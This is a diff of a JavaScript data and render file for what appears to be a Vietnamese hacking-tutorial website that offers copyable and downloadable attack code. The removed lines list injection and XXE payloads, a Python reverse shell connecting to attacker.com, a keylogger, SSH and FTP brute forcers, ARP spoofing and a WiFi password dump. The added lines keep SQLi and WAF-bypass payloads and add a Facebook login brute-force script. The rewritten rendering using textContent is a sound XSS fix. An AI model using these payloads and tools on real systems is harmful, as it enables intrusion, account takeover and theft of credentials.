@@ -1,289 +1,236 @@
-// ================== POSTS DATA ==================
-// post.js
+// ================== POSTS DATA (giữ nguyên cấu trúc như bạn đang dùng) ==================
 const posts = {
   news: [
     {
-      title: "Anonymous trở lại",
-      content: "Nhóm hacker Anonymous vừa công bố chiến dịch mới nhằm vào các tập đoàn lớn.",
-      code: "https://anonymous.com/news"
+      title: "Zero-Day mới trên Windows",
+      content:
+        "Một lỗ hổng zero-day vừa được công bố, cho phép attacker leo thang đặc quyền thông qua dịch vụ Print Spooler.",
+      link: "https://thehackernews.com/",
     },
     {
-      title: "Rò rỉ dữ liệu 1 triệu tài khoản",
-      content: "Một cơ sở dữ liệu hơn 1 triệu tài khoản bị rò rỉ trên darkweb.",
-      code: "https://leakcheck.io"
-    }
+      title: "Anonymous tấn công chính phủ",
+      content:
+        "Nhóm hacker Anonymous đã công bố dữ liệu từ nhiều website chính phủ sau chiến dịch tấn công DDoS.",
+      link: "https://www.reuters.com/",
+    },
   ],
 
   tutorials: [
     {
       title: "SQL Injection cơ bản",
-      content: "Cách khai thác SQL Injection trên form đăng nhập không an toàn.",
-      code: `' OR '1'='1 --`
+      content:
+        "Hướng dẫn cách khai thác SQL Injection trên các ứng dụng web không an toàn.",
+      code: `# SQLi Test Payload
+' OR '1'='1
+' UNION SELECT null, username, password FROM users --`,
+      lang: "sql",
     },
     {
-      title: "SQL Injection nâng cao",
-      content: "Sử dụng UNION để trích xuất dữ liệu từ bảng users.",
-      code: `' UNION SELECT null, username, password FROM users --`
+      title: "Bypass WAF cơ bản",
+      content:
+        "Cách vượt qua một số Web Application Firewall phổ biến bằng cách encode payload.",
+      code: `# WAF Bypass Payload
+admin'/**/OR/**/'1'='1
+<script>alert(1)</script>`,
+      lang: "plaintext",
     },
-    {
-      title: "XSS cơ bản",
-      content: "Cách chèn JavaScript vào input để popup cảnh báo.",
-      code: `<script>alert('XSS')</script>`
-    },
-    {
-      title: "Stored XSS",
-      content: "XSS được lưu lại trong database và hiển thị cho tất cả người dùng.",
-      code: `<img src=x onerror=alert('Hacked!')>`
-    },
-    {
-      title: "Reflected XSS",
-      content: "XSS thông qua URL hoặc query string.",
-      code: `http://victim.com/page?q=<script>alert(1)</script>`
-    },
-    {
-      title: "Command Injection",
-      content: "Inject lệnh hệ thống vào parameter không kiểm soát.",
-      code: `; cat /etc/passwd`
-    },
-    {
-      title: "LFI (Local File Inclusion)",
-      content: "Khai thác lỗi include file cục bộ.",
-      code: `http://site.com/index.php?page=../../etc/passwd`
-    },
-    {
-      title: "RFI (Remote File Inclusion)",
-      content: "Chèn file từ server bên ngoài.",
-      code: `http://site.com/index.php?page=http://attacker.com/shell.txt`
-    },
-    {
-      title: "CSRF cơ bản",
-      content: "Tạo form giả mạo để nạn nhân gửi request không mong muốn.",
-      code: `<form action="http://victim.com/delete" method="POST"><input type="submit"></form>`
-    },
-    {
-      title: "XXE Injection",
-      content: "Khai thác XML External Entity để đọc file nhạy cảm.",
-      code: `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>`
-    },
-    {
-      title: "Bypass Login Form",
-      content: "Payload đơn giản để qua mặt xác thực yếu.",
-      code: `admin'--`
-    },
-    {
-      title: "NoSQL Injection",
-      content: "Tấn công database MongoDB không an toàn.",
-      code: `{ "username": { "$ne": null }, "password": { "$ne": null } }`
-    },
-    {
-      title: "JWT Token Forgery",
-      content: "Thay đổi thuật toán để giả mạo token.",
-      code: `{"alg":"none","typ":"JWT"}`
-    },
-    {
-      title: "IDOR (Insecure Direct Object Reference)",
-      content: "Truy cập tài nguyên bằng cách thay đổi ID.",
-      code: `http://site.com/profile?id=1002`
-    },
-    {
-      title: "Path Traversal",
-      content: "Đọc file nhạy cảm bằng ../",
-      code: `http://victim.com/getfile?name=../../../../etc/passwd`
-    }
   ],
 
   tools: [
     {
+      title: "Brute Force Facebook",
+      content:
+        "Tool Python brute-force login Facebook (dùng cho mục đích nghiên cứu).",
+      code: `import requests
+
+url = "https://facebook.com/login"
+for pwd in ["123456", "password", "letmein"]:
+    r = requests.post(url, data={"email":"victim","pass":pwd})
+    if "Welcome" in r.text:
+        print("Found password:", pwd)
+        break`,
+      download: "https://example.com/fb_bruteforce.py",
+      lang: "python",
+      filename: "fb_bruteforce.py",
+    },
+    {
       title: "Port Scanner",
-      content: "Tool Python scan port cơ bản.",
+      content: "Tool scan port đơn giản với Python.",
       code: `import socket
+
+target = "127.0.0.1"
 for port in range(1,1000):
-    s=socket.socket(); s.settimeout(0.5)
-    try: s.connect(("127.0.0.1",port)); print("Open:",port)
-    except: pass`,
-      download: "https://example.com/port_scanner.py"
-    },
-    {
-      title: "Subdomain Finder",
-      content: "Script tìm subdomain từ wordlist.",
-      code: `import requests
-domains=["www","mail","test"]
-for d in domains:
-    url=f"http://{d}.target.com"
-    try: requests.get(url); print("Found:",url)
-    except: pass`,
-      download: "https://example.com/subfinder.py"
-    },
-    {
-      title: "Brute Force FTP",
-      content: "Brute force login FTP với Python.",
-      code: `import ftplib
-server="127.0.0.1"
-user="admin"
-for pwd in ["123456","password"]:
+    s = socket.socket()
+    s.settimeout(0.5)
     try:
-        ftp=ftplib.FTP(server)
-        ftp.login(user,pwd)
-        print("Password:",pwd)
-        break
-    except: pass`,
-      download: "https://example.com/ftp_brute.py"
+        s.connect((target, port))
+        print("Port open:", port)
+    except:
+        pass`,
+      download: "https://example.com/port_scanner.py",
+      lang: "python",
+      filename: "port_scanner.py",
     },
-    {
-      title: "SSH Brute Force",
-      content: "Brute force SSH login.",
-      code: `import paramiko
-for pwd in ["123456","root"]:
-    ssh=paramiko.SSHClient(); ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-    try:
-        ssh.connect("127.0.0.1", username="root", password=pwd)
-        print("Found:",pwd); break
-    except: pass`,
-      download: "https://example.com/ssh_brute.py"
-    },
-    {
-      title: "Simple Keylogger",
-      content: "Keylogger thu thập phím bấm.",
-      code: `from pynput import keyboard
-def on_press(key): print("Key:",key)
-with keyboard.Listener(on_press=on_press) as l: l.join()`,
-      download: "https://example.com/keylogger.py"
-    },
-    {
-      title: "Basic Packet Sniffer",
-      content: "Tool sniff packet trên mạng LAN.",
-      code: `import socket
-s=socket.socket(socket.AF_INET,socket.SOCK_RAW,socket.IPPROTO_IP)
-s.bind(("192.168.1.5",0)); print("Sniffing...")`,
-      download: "https://example.com/sniffer.py"
-    },
-    {
-      title: "HTTP Header Grabber",
-      content: "Tool lấy thông tin header từ website.",
-      code: `import requests
-url="http://target.com"
-r=requests.get(url)
-print(r.headers)`,
-      download: "https://example.com/header_grabber.py"
-    },
-    {
-      title: "Simple Web Crawler",
-      content: "Tool crawl URL từ website.",
-      code: `import requests, re
-r=requests.get("http://target.com")
-for url in re.findall('href="(http.*?)"',r.text): print(url)`,
-      download: "https://example.com/crawler.py"
-    },
-    {
-      title: "Directory Bruteforce",
-      content: "Tìm thư mục ẩn với wordlist.",
-      code: `import requests
-for d in ["admin","backup","login"]:
-    url="http://target.com/"+d
-    if requests.get(url).status_code==200: print("Found:",url)`,
-      download: "https://example.com/dirbf.py"
-    },
-    {
-      title: "Simple Reverse Shell",
-      content: "Python reverse shell.",
-      code: `import socket,os,pty
-s=socket.socket(); s.connect(("attacker.com",4444))
-[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
-pty.spawn("/bin/bash")`,
-      download: "https://example.com/revshell.py"
-    },
-    {
-      title: "ARP Spoofing",
-      content: "Tool spoof ARP để MITM.",
-      code: `from scapy.all import *
-send(ARP(op=2,pdst="192.168.1.1",hwdst="xx:xx:xx:xx",psrc="192.168.1.100"))`,
-      download: "https://example.com/arpspoof.py"
-    },
-    {
-      title: "DNS Lookup",
-      content: "Tool tra cứu DNS record.",
-      code: `import socket
-print(socket.gethostbyname("example.com"))`,
-      download: "https://example.com/dnslookup.py"
-    },
-    {
-      title: "Hash Cracker",
-      content: "Crack MD5 hash bằng wordlist.",
-      code: `import hashlib
-h="5d41402abc4b2a76b9719d911017c592"
-for w in ["hello","world"]:
-    if hashlib.md5(w.encode()).hexdigest()==h: print("Found:",w)`,
-      download: "https://example.com/hashcrack.py"
-    },
-    {
-      title: "WiFi Password Stealer",
-      content: "Dump WiFi password trong Windows.",
-      code: `import os
-os.system("netsh wlan show profile name=wifi key=clear")`,
-      download: "https://example.com/wifi_dump.py"
-    },
-    {
-      title: "Screenshot Grabber",
-      content: "Tool chụp màn hình tự động.",
-      code: `import pyautogui
-img=pyautogui.screenshot()
-img.save("screen.png")`,
-      download: "https://example.com/screenshot.py"
-    }
-  ]
+  ],
 };
 
+// ================== UTILS (an toàn) ==================
+function safeURL(url) {
+  try {
+    const u = new URL(url, location.href);
+    if (u.protocol === "http:" || u.protocol === "https:") return u.href;
+  } catch (_) {}
+  return "#";
+}
+function el(tag, cls) {
+  const e = document.createElement(tag);
+  if (cls) e.className = cls;
+  return e;
+}
 
+// ================== RENDER (không dùng innerHTML cho dữ liệu động) ==================
+function renderNews() {
+  const wrap = document.getElementById("news");
+  if (!wrap) return;
+  wrap.innerHTML = ""; // khung rỗng
 
-// ================== RENDER POSTS ==================
-function renderPosts() {
-  // News
-  const newsContainer = document.getElementById("news");
-  posts.news.forEach(post => {
-    newsContainer.innerHTML += `
-      <div class="card">
-        <h2>📡 ${post.title}</h2>
-        <p>${post.content}</p>
-        <a href="${post.link}" target="_blank">
-          <button class="btn read-btn">🔗 Read More</button>
-        </a>
-      </div>`;
-  });
+  posts.news.forEach((p) => {
+    const card = el("div", "card");
 
-  // Tutorials
-  const tutContainer = document.getElementById("tutorials");
-  posts.tutorials.forEach(post => {
-    tutContainer.innerHTML += `
-      <div class="card">
-        <h2>💻 ${post.title}</h2>
-        <p>${post.content}</p>
-        <pre><code>${post.code}</code></pre>
-        <button class="btn copy-btn" onclick="copyCode(\`${post.code}\`)">📋 Copy</button>
-      </div>`;
-  });
+    const h2 = el("h2");
+    h2.textContent = "📡 " + (p.title || "");
+    const desc = el("p");
+    desc.textContent = p.content || "";
 
-  // Tools
-  const toolContainer = document.getElementById("tools");
-  posts.tools.forEach(post => {
-    toolContainer.innerHTML += `
-      <div class="card">
-        <h2>🛠 ${post.title}</h2>
-        <p>${post.content}</p>
-        <pre><code>${post.code}</code></pre>
-        <button class="btn copy-btn" onclick="copyCode(\`${post.code}\`)">📋 Copy</button>
-        <a href="${post.download}" download>
-          <button class="btn download-btn">⬇ Download</button>
-        </a>
-      </div>`;
+    const a = el("a");
+    a.href = safeURL(p.link || "#");
+    a.target = "_blank";
+    a.rel = "noopener noreferrer";
+
+    const btn = el("button", "btn read-btn");
+    btn.textContent = "🔗 Read More";
+    a.appendChild(btn);
+
+    card.append(h2, desc, a);
+    wrap.appendChild(card);
   });
 }
 
-// ================== FUNCTIONS ==================
-function copyCode(code) {
-  navigator.clipboard.writeText(code).then(() => {
-    alert("✅ Code copied to clipboard!");
+function renderTutorials() {
+  const wrap = document.getElementById("tutorials");
+  if (!wrap) return;
+  wrap.innerHTML = "";
+
+  posts.tutorials.forEach((p, i) => {
+    const card = el("div", "card");
+    const h2 = el("h2");
+    h2.textContent = "💻 " + (p.title || "");
+    const desc = el("p");
+    desc.textContent = p.content || "";
+
+    // code block
+    const pre = el("pre");
+    const code = el("code");
+    code.id = `tut-${i}`;
+    if (p.lang) code.className = `language-${p.lang}`;
+    // QUAN TRỌNG: dùng textContent để không thực thi payload
+    code.textContent = (p.code || "").trim();
+    pre.appendChild(code);
+
+    const copy = el("button", "btn copy-btn");
+    copy.textContent = "📋 Copy";
+    copy.dataset.copy = code.id;
+
+    card.append(h2, desc, pre, copy);
+    wrap.appendChild(card);
   });
 }
 
-// Run
-document.addEventListener("DOMContentLoaded", renderPosts);
+const downloadMap = {};
+function renderTools() {
+  const wrap = document.getElementById("tools");
+  if (!wrap) return;
+  wrap.innerHTML = "";
+
+  posts.tools.forEach((p, i) => {
+    const card = el("div", "card");
+    const h2 = el("h2");
+    h2.textContent = "🛠 " + (p.title || "");
+    const desc = el("p");
+    desc.textContent = p.content || "";
+
+    const pre = el("pre");
+    const code = el("code");
+    code.id = `tool-${i}`;
+    if (p.lang) code.className = `language-${p.lang}`;
+    code.textContent = (p.code || "").trim(); // không thực thi
+    pre.appendChild(code);
+
+    const copy = el("button", "btn copy-btn");
+    copy.textContent = "📋 Copy";
+    copy.dataset.copy = code.id;
+
+    const dl = el("button", "btn download-btn");
+    dl.textContent = "⬇ Download";
+    dl.dataset.download = code.id;
+    dl.dataset.filename = p.filename || "code.txt";
+    downloadMap[code.id] = (p.download || p.code || "").trim();
+
+    card.append(h2, desc, pre, copy, dl);
+    wrap.appendChild(card);
+  });
+}
+
+// ================== HÀNH ĐỘNG (Copy/Download an toàn) ==================
+function wireActions() {
+  document.addEventListener("click", (e) => {
+    // Copy
+    if (e.target.matches("[data-copy]")) {
+      const id = e.target.getAttribute("data-copy");
+      const node = document.getElementById(id);
+      if (!node) return;
+      const txt = node.textContent;
+      navigator.clipboard
+        .writeText(txt)
+        .then(() => {
+          e.target.textContent = "✅ Copied";
+          setTimeout(() => (e.target.textContent = "📋 Copy"), 1200);
+        })
+        .catch(() => alert("Copy thất bại"));
+    }
+
+    // Download
+    if (e.target.matches("[data-download]")) {
+      const id = e.target.getAttribute("data-download");
+      const filename = e.target.getAttribute("data-filename") || "code.txt";
+      const content = downloadMap[id] || "";
+      const blob = new Blob([content], {
+        type: "text/plain;charset=utf-8",
+      });
+      const a = document.createElement("a");
+      a.href = URL.createObjectURL(blob);
+      a.download = filename;
+      document.body.appendChild(a);
+      a.click();
+      document.body.removeChild(a);
+    }
+  });
+}
+
+// ================== INIT ==================
+function init() {
+  renderNews();
+  renderTutorials();
+  renderTools();
+  wireActions();
+
+  if (window.hljs && typeof hljs.highlightAll === "function") {
+    hljs.highlightAll();
+  }
+}
+
+if (document.readyState === "loading") {
+  document.addEventListener("DOMContentLoaded", init);
+} else {
+  init();
+}
